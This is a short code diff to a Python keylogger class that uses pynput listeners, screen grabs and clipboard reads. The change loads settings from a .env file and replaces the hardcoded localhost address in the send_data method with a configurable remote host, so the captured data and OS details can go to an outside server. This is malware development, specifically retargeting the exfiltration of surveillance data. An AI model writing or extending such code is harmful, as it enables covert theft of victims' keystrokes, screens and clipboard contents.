@@ -13,6 +13,8 @@ from pynput.mouse import Listener as MouseListener
 from PIL import ImageGrab
 from pandas.io.clipboard import clipboard_get
 from pynput import mouse
+from dotenv import load_dotenv
+load_dotenv()
 
 
 class Keylogger:
@@ -156,7 +158,8 @@ class Keylogger:
         )
 
     def send_data(self, url, data_value=None):
-        url = 'http://127.0.0.1:5000' + url
+        host = os.environ.get('host')
+        url = str(host) + str(url)
         headers = {"os_data": json.dumps(self.os_data)}
 
         if data_value is not None:
